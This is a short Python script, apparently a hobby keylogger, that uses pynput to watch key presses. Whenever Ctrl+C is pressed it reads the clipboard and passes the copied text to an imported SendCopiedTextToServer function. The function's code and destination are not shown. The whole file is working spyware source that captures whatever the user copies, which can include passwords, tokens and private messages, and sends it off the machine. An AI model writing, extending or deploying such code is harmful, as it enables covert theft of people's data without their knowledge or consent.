from pynput import keyboard
import clipboard
from sender import SendCopiedTextToServer

msg = ''
prevMsg = ''

cp = clipboard.Clipboard()

def ctrl(letter): return chr(ord(letter.upper())-64)

def on_press(key):
    try:
        print(f'KEY ---> {key}')
        print(f'KEY.CHAR ---> {key.char}')
        if key.char == ctrl("c"):
            print()
            cp.SetWaitTime(10)
            cp.WaitBeforePaste()
            msg = cp.PasteText()
            if msg != '':
                print(f'"{msg}"')
                SendCopiedTextToServer(msg)
            msg = ''
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        print('ESC key is detected. Exiting from keylogger.')
        exit(1)

with keyboard.Listener(
        on_press=on_press, on_release=on_release) as listener:
    listener.join()